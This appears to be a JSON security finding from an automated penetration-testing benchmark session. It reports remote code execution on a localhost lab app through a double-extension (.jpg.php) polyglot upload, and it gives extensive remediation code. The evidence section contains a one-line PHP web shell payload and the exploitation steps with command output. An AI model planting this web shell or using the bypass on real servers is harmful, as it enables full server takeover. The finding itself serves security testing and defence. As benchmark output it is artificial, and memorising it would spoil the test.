{
  "title": "Remote Code Execution via Double Extension File Upload Bypass",
  "severity": "CRITICAL",
  "description": "The file upload functionality at /index.php is vulnerable to arbitrary file upload and Remote Code Execution (RCE). The application validates uploaded files by checking JPEG magic bytes (FF D8 FF E0) and MIME type (image/jpeg), but fails to properly validate file extensions when multiple extensions are used.\n\nAn attacker can bypass all validation controls by uploading a polyglot file with a double extension (e.g., `.jpg.php`). The validation logic:\n1. Checks MIME type: image/jpeg ✓\n2. Checks magic bytes: FF D8 FF E0 (valid JPG header) ✓\n3. Checks extension: ends with .jpg ✓ (but filename is shell.jpg.php)\n4. Saves file with submitted filename as-is\n\nApache/PHP processes the rightmost extension (.php) as the executable file type, while the application's extension check only validates that it ends with .jpg. This allows the double extension `shell.jpg.php` to pass validation and be saved with the `.php` extension intact.\n\nOnce uploaded, accessing the file via HTTP causes Apache to process it as a PHP file, executing the embedded PHP code with the privileges of the www-data user.\n\nThe vulnerability chain:\n- Polyglot JPG file with valid magic bytes + embedded PHP code\n- Upload with filename: shell.jpg.php\n- Validation passes (contains valid JPG header, ends with .jpg)\n- File saved to: /upload/shell.jpg.php\n- Accessed via HTTP: Apache executes as PHP\n- Arbitrary commands executed on the server",
  "impact": "Complete Remote Code Execution on the web server with www-data privileges. An attacker can:\n- Execute arbitrary system commands\n- Read/write/delete files on the server\n- Install malware or backdoors\n- Access sensitive data and configuration files\n- Modify application data\n- Use the server to pivot and attack other systems on the network\n- Cause denial of service\n- Establish persistent access\n\nThis is a critical security issue allowing full compromise of the web server and potential further lateral movement within the network.",
  "endpoint": "http://localhost:8080/index.php",
  "evidence": "POC execution confirmed RCE vulnerability:\n\n1. Created polyglot JPG/PHP file with embedded payload: `<?php system($_GET[\"cmd\"]); ?>`\n2. Uploaded file with double extension: shell.jpg.php\n3. File passed validation (contains valid JPG header FF D8 FF E0, ends with .jpg)\n4. File accepted and saved to: /upload/shell.jpg.php\n5. Accessed via: http://localhost:8080/upload/shell.jpg.php?cmd=id\n6. Server executed PHP code and returned: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`\n\nAdditional verification:\n- Command: whoami → Result: www-data\n- Command: pwd → Result: /var/www/html/upload\n- File accessible via web browser at the exact uploaded path\n\nUpload response confirmed file acceptance:\n```\nFile is valid, and was successfully uploaded <a href='upload/shell.jpg.php'>here</a>.\n```\n\nThe POC demonstrates successful bypass of all file validation controls and execution of arbitrary PHP code on the server.",
  "pocPath": "pocs/poc_rce_double_extension_upload.sh",
  "remediation": "1. **Implement strict file extension validation**:\n   - Use whitelist of allowed extensions: ['jpg', 'jpeg', 'png', 'gif']\n   - Check extension case-insensitively\n   - Reject files with multiple/double extensions\n   - Use pathinfo($filename, PATHINFO_EXTENSION) to extract only the last extension\n\n2. **Properly validate file content**:\n   - Check MIME type using finfo_file() (not just Content-Type header)\n   - Verify JPEG magic bytes (FF D8 FF E0)\n   - Use getimagesize() to verify it's a valid image\n   - Reject files that don't match expected image structure\n\n3. **Store uploads outside web root**:\n   - Save files to a directory not accessible via HTTP\n   - Serve files through a download handler script that sets Content-Type headers\n   - Example: Store in /var/uploads/ instead of /var/www/html/upload\n\n4. **Disable PHP execution in upload directory**:\n   - Add .htaccess to /upload/ directory:\n     ```\n     php_flag engine off\n     AddType text/plain .php .phtml .php3 .php4 .php5 .pht .phps\n     ```\n   - Or configure Apache/nginx to disable PHP execution for this directory\n   - Prevent execution of any server-side scripts (.py, .rb, .pl, etc.)\n\n5. **Rename uploaded files**:\n   - Generate secure random filenames: bin2hex(random_bytes(16))\n   - Append only the validated extension\n   - Store original filename in database if needed\n   - Example: `a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6.jpg`\n\n6. **Implement comprehensive validation**:\n```php\n$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];\n$max_file_size = 5 * 1024 * 1024; // 5MB\n\n// Get uploaded file\n$tmp_file = $_FILES['userfile']['tmp_name'];\n$filename = $_FILES['userfile']['name'];\n\n// Check file size\nif ($_FILES['userfile']['size'] > $max_file_size) {\n    die('File too large');\n}\n\n// Extract and validate extension\n$path_info = pathinfo($filename, PATHINFO_EXTENSION);\n$extension = strtolower($path_info);\n\n// Reject multiple extensions\nif (substr_count($filename, '.') > 1) {\n    die('Multiple extensions not allowed');\n}\n\n// Whitelist extension\nif (!in_array($extension, $allowed_extensions)) {\n    die('File type not allowed');\n}\n\n// Validate MIME type\n$finfo = finfo_open(FILEINFO_MIME_TYPE);\n$mime = finfo_file($finfo, $tmp_file);\n$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];\nif (!in_array($mime, $allowed_mimes)) {\n    die('Invalid MIME type');\n}\n\n// Validate actual image\n$image_info = getimagesize($tmp_file);\nif ($image_info === false) {\n    die('Not a valid image');\n}\n\n// Generate secure filename\n$new_filename = bin2hex(random_bytes(16)) . '.' . $extension;\n\n// Store outside web root\n$upload_path = '/var/uploads/' . $new_filename;\nmove_uploaded_file($tmp_file, $upload_path);\n\n// Store mapping in database for serving\n// When user needs file: serve from handler script with Content-Type header\n```\n\n7. **Use a download handler for serving files**:\n```php\n// serve_file.php\n$file_id = $_GET['id'];\n// Validate file_id against database\n$file = db_get_file($file_id);\nif (!$file) die('File not found');\n\nheader('Content-Type: image/jpeg');\nheader('Content-Disposition: attachment; filename=\"'.$file['original_name'].'\"');\nreadfile('/var/uploads/' . $file['stored_name']);\n```\n\n8. **Security headers**:\n   - Set X-Content-Type-Options: nosniff\n   - Set Content-Security-Policy to restrict script execution\n   - Use X-Frame-Options to prevent clickjacking",
  "references": "OWASP A04:2021 - Insecure File Upload, CWE-434 - Unrestricted Upload of File with Dangerous Type, CWE-436 - Incorrect Parsing of HTTP Request Line, PHP Double Extension Handling Security Issues, Multiple CVEs involving double extension bypasses in web applications",
  "toolCallDescription": "Document CRITICAL RCE vulnerability via double extension file upload bypass with confirmed POC execution",
  "timestamp": "2025-11-07T19:27:09.676Z",
  "sessionId": "benchmark-XBEN-067-24-mhp8bhdm",
  "target": "./repo"
}